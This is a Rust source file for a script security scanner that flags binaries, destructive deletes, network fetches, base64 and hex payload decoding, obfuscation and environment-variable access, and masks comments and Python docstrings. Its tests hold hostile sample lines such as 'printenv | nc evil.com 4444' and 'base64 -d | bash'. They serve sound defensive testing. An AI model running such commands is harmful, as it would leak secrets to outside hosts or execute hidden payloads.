use std::path::Path;

use crate::error::Result;

use super::binary_analyzer::BinaryAnalyzer;
use super::compiled_rules::SC_RULES;
use super::normalize;
use super::{Finding, RiskLevel, ScanReport};

/// Check if a line is a single-line comment (shell/python #, JS/TS //, SQL/Lua --).
fn is_comment_line(line: &str) -> bool {
    let trimmed = line.trim_start();
    trimmed.starts_with('#') || trimmed.starts_with("//") || trimmed.starts_with("--")
}

/// Python files where docstring masking is useful. We also run the mask on
/// extensionless files that begin with a python shebang.
fn should_apply_python_docstring_mask(path: &Path, content: &str) -> bool {
    if path.extension().and_then(|e| e.to_str()) == Some("py") {
        return true;
    }
    content
        .lines()
        .next()
        .map(|first| first.starts_with("#!") && first.contains("python"))
        .unwrap_or(false)
}

pub struct ScriptAnalyzer;

impl ScriptAnalyzer {
    /// Analyze a script file for security issues.
    pub fn analyze(path: &Path, rel_path: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new();

        // SC-001: Binary detection (shared implementation)
        if BinaryAnalyzer::is_executable(path)? {
            report.add(Finding {
                rule_id: "SC-001".to_string(),
                level: RiskLevel::Danger,
                message: "binary executable detected in scripts".to_string(),
                file: rel_path.to_string(),
                line: None,
                context: None,
            });
            return Ok(report);
        }

        // Read content for text analysis
        let content = match std::fs::read_to_string(path) {
            Ok(c) => c,
            Err(_) => {
                // If we can't read as text, it might be binary
                report.add(Finding {
                    rule_id: "SC-001".to_string(),
                    level: RiskLevel::Danger,
                    message: "file cannot be read as text (possibly binary)".to_string(),
                    file: rel_path.to_string(),
                    line: None,
                    context: None,
                });
                return Ok(report);
            }
        };

        // Normalize content: join shell continuation lines and pre-compute whitespace normalization
        let logical_lines = normalize::join_continuation_lines(&content);
        let normalized_texts: Vec<String> = logical_lines
            .iter()
            .map(|ll| normalize::normalize_whitespace(&ll.text))
            .collect();

        // Compute which original lines sit inside a Python triple-quoted
        // docstring. These are pure documentation and should not fire
        // WARN/DANGER matches (they're not executable code). BLOCK-level
        // rules still fire inside docstrings because mentions of things
        // like self-replication are worth reviewing even in prose.
        let docstring_mask: Vec<bool> = if should_apply_python_docstring_mask(path, &content) {
            normalize::python_docstring_mask(&content)
        } else {
            Vec::new()
        };

        // SC-002 through SC-015: Pre-compiled pattern matching
        for rule in SC_RULES.iter() {
            for re in &rule.patterns {
                for (idx, ll) in logical_lines.iter().enumerate() {
                    if re.is_match(&normalized_texts[idx]) {
                        // Skip WARN-level matches on comment lines to reduce false positives.
                        // DANGER/BLOCK level rules still fire on comments (worth reviewing).
                        if rule.level == RiskLevel::Warn && is_comment_line(&ll.text) {
                            continue;
                        }
                        // Skip WARN/DANGER matches that sit entirely inside
                        // a Python docstring.
                        if rule.level != RiskLevel::Block
                            && docstring_mask.get(ll.start_line).copied().unwrap_or(false)
                        {
                            continue;
                        }
                        report.add(Finding {
                            rule_id: rule.id.to_string(),
                            level: rule.level,
                            message: format!("{}: {}", rule.description, re.as_str()),
                            file: rel_path.to_string(),
                            line: Some(ll.start_line + 1),
                            context: Some(ll.original_text.trim().to_string()),
                        });
                        break;
                    }
                }
            }
        }

        Ok(report)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_is_comment_line_shell() {
        assert!(is_comment_line("# this is a comment"));
        assert!(is_comment_line("  # indented comment"));
    }

    #[test]
    fn test_is_comment_line_js() {
        assert!(is_comment_line("// JS comment"));
        assert!(is_comment_line("  // indented"));
    }

    #[test]
    fn test_is_comment_line_sql() {
        assert!(is_comment_line("-- SQL comment"));
        assert!(is_comment_line("  -- indented"));
    }

    #[test]
    fn test_is_comment_line_not_comment() {
        assert!(!is_comment_line("curl https://example.com"));
        assert!(!is_comment_line("echo hello"));
        assert!(!is_comment_line(""));
    }

    /// Helper: write a temp script file, analyze it, return the report.
    fn analyze_script_content(content: &str) -> ScanReport {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("test.sh");
        std::fs::write(&path, content).unwrap();
        ScriptAnalyzer::analyze(&path, "test.sh").unwrap()
    }

    /// Helper: write a temp .py file, analyze it, return the report.
    fn analyze_python_content(content: &str) -> ScanReport {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("test.py");
        std::fs::write(&path, content).unwrap();
        ScriptAnalyzer::analyze(&path, "test.py").unwrap()
    }

    #[test]
    fn test_sc006_comment_line_skipped() {
        let report = analyze_script_content("# curl https://example.com\n");
        let sc006: Vec<_> = report
            .findings
            .iter()
            .filter(|f| f.rule_id == "SC-006")
            .collect();
        assert!(sc006.is_empty(), "SC-006 should not fire on comment lines");
    }

    #[test]
    fn test_sc006_code_line_triggers() {
        let report = analyze_script_content("curl https://example.com\n");
        let sc006: Vec<_> = report
            .findings
            .iter()
            .filter(|f| f.rule_id == "SC-006")
            .collect();
        assert!(!sc006.is_empty(), "SC-006 should fire on actual code");
    }

    #[test]
    fn test_sc007_comment_line_skipped() {
        let report = analyze_script_content("# > /tmp/out\n");
        let sc007: Vec<_> = report
            .findings
            .iter()
            .filter(|f| f.rule_id == "SC-007")
            .collect();
        assert!(sc007.is_empty(), "SC-007 should not fire on comment lines");
    }

    #[test]
    fn test_sc008_comment_line_skipped() {
        let report = analyze_script_content("# sudo apt install foo\n");
        let sc008: Vec<_> = report
            .findings
            .iter()
            .filter(|f| f.rule_id == "SC-008")
            .collect();
        assert!(sc008.is_empty(), "SC-008 should not fire on comment lines");
    }

    #[test]
    fn test_sc002_danger_still_fires_on_comment() {
        let report = analyze_script_content("# eval(\n");
        let sc002: Vec<_> = report
            .findings
            .iter()
            .filter(|f| f.rule_id == "SC-002")
            .collect();
        assert!(
            !sc002.is_empty(),
            "DANGER rules should still fire on comment lines"
        );
    }

    // ── SC-012: Base64 decode execution ──

    #[test]
    fn test_sc012_base64_decode_triggers() {
        let report = analyze_script_content("echo payload | base64 -d | bash\n");
        let findings: Vec<_> = report
            .findings
            .iter()
            .filter(|f| f.rule_id == "SC-012")
            .collect();
        assert!(!findings.is_empty(), "SC-012 should detect base64 -d");
    }

    #[test]
    fn test_sc012_python_b64decode_triggers() {
        let report = analyze_script_content("import base64\nbase64.b64decode(encoded)\n");
        let findings: Vec<_> = report
            .findings
            .iter()
            .filter(|f| f.rule_id == "SC-012")
            .collect();
        assert!(!findings.is_empty(), "SC-012 should detect b64decode");
    }

    #[test]
    fn test_sc012_base64_encode_no_trigger() {
        let report = analyze_script_content("base64 file.txt > encoded.txt\n");
        let findings: Vec<_> = report
            .findings
            .iter()
            .filter(|f| f.rule_id == "SC-012")
            .collect();
        assert!(
            findings.is_empty(),
            "SC-012 should not trigger on base64 encode"
        );
    }

    // ── SC-013: Hex-encoded execution ──

    #[test]
    fn test_sc013_fromhex_triggers() {
        let report = analyze_script_content("data = bytes.fromhex('48656c6c6f')\n");
        let findings: Vec<_> = report
            .findings
            .iter()
            .filter(|f| f.rule_id == "SC-013")
            .collect();
        assert!(!findings.is_empty(), "SC-013 should detect bytes.fromhex");
    }

    #[test]
    fn test_sc013_hex_color_no_trigger() {
        let report = analyze_script_content("hex_color = '#ffffff'\n");
        let findings: Vec<_> = report
            .findings
            .iter()
            .filter(|f| f.rule_id == "SC-013")
            .collect();
        assert!(
            findings.is_empty(),
            "SC-013 should not trigger on hex colors"
        );
    }

    // ── SC-014: String concatenation obfuscation ──

    #[test]
    fn test_sc014_fromcharcode_triggers() {
        let report = analyze_script_content("var cmd = String.fromCharCode(101, 118, 97, 108);\n");
        let findings: Vec<_> = report
            .findings
            .iter()
            .filter(|f| f.rule_id == "SC-014")
            .collect();
        assert!(
            !findings.is_empty(),
            "SC-014 should detect String.fromCharCode"
        );
    }

    #[test]
    fn test_sc014_charcodeat_no_trigger() {
        let report = analyze_script_content("var code = str.charCodeAt(0);\n");
        let findings: Vec<_> = report
            .findings
            .iter()
            .filter(|f| f.rule_id == "SC-014")
            .collect();
        assert!(
            findings.is_empty(),
            "SC-014 should not trigger on charCodeAt"
        );
    }

    // ── SC-015: Environment variable exfiltration ──

    #[test]
    fn test_sc015_os_environ_triggers() {
        let report = analyze_script_content("import os\nfor k, v in os.environ.items():\n");
        let findings: Vec<_> = report
            .findings
            .iter()
            .filter(|f| f.rule_id == "SC-015")
            .collect();
        assert!(!findings.is_empty(), "SC-015 should detect os.environ");
    }

    #[test]
    fn test_sc015_process_env_triggers() {
        let report = analyze_script_content("const secrets = process.env;\n");
        let findings: Vec<_> = report
            .findings
            .iter()
            .filter(|f| f.rule_id == "SC-015")
            .collect();
        assert!(!findings.is_empty(), "SC-015 should detect process.env");
    }

    #[test]
    fn test_sc015_printenv_triggers() {
        let report = analyze_script_content("printenv | nc evil.com 4444\n");
        let findings: Vec<_> = report
            .findings
            .iter()
            .filter(|f| f.rule_id == "SC-015")
            .collect();
        assert!(!findings.is_empty(), "SC-015 should detect printenv");
    }

    // ── Python docstring skipping ──

    #[test]
    fn test_sc003_skipped_inside_python_docstring() {
        let content =
            "def foo():\n    \"\"\"\n    Behaves like rm -rf but safer.\n    \"\"\"\n    pass\n";
        let report = analyze_python_content(content);
        let sc003: Vec<_> = report
            .findings
            .iter()
            .filter(|f| f.rule_id == "SC-003")
            .collect();
        assert!(
            sc003.is_empty(),
            "SC-003 should not fire on `rm -rf` inside a Python docstring"
        );
    }

    #[test]
    fn test_sc003_still_fires_on_real_python_code() {
        let content = "import shutil\nshutil.rmtree(path)\n";
        let report = analyze_python_content(content);
        let sc003: Vec<_> = report
            .findings
            .iter()
            .filter(|f| f.rule_id == "SC-003")
            .collect();
        assert!(
            !sc003.is_empty(),
            "SC-003 should still fire on real shutil.rmtree() calls"
        );
    }

    #[test]
    fn test_sc007_skipped_inside_python_docstring() {
        // Mirrors the real false positive from aggregate_history.py:
        // `Output shape (written to <workdir>/history.json)::`
        let content =
            "\"\"\"Module doc.\n\nOutput written to <workdir>/history.json\n\"\"\"\nimport os\n";
        let report = analyze_python_content(content);
        let sc007: Vec<_> = report
            .findings
            .iter()
            .filter(|f| f.rule_id == "SC-007")
            .collect();
        assert!(
            sc007.is_empty(),
            "SC-007 should not fire on `>/` inside a Python docstring"
        );
    }

    #[test]
    fn test_docstring_mask_disabled_on_shell_scripts() {
        // Shell scripts don't get the mask — verifies we don't accidentally
        // mask unrelated file types.
        let content = "cat <<EOF\n\"\"\"\nrm -rf /tmp\n\"\"\"\nEOF\n";
        let report = analyze_script_content(content);
        let sc003: Vec<_> = report
            .findings
            .iter()
            .filter(|f| f.rule_id == "SC-003")
            .collect();
        assert!(
            !sc003.is_empty(),
            "shell heredocs are not docstrings — SC-003 must still fire"
        );
    }

    #[test]
    fn test_python_shebang_enables_docstring_mask() {
        // A file without .py extension but with a python shebang should
        // still benefit from the mask.
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("run_thing");
        let content = "#!/usr/bin/env python3\n\"\"\"\nrm -rf /\n\"\"\"\nprint('ok')\n";
        std::fs::write(&path, content).unwrap();
        let report = ScriptAnalyzer::analyze(&path, "run_thing").unwrap();
        let sc003: Vec<_> = report
            .findings
            .iter()
            .filter(|f| f.rule_id == "SC-003")
            .collect();
        assert!(
            sc003.is_empty(),
            "python-shebang files should get docstring masking"
        );
    }
}
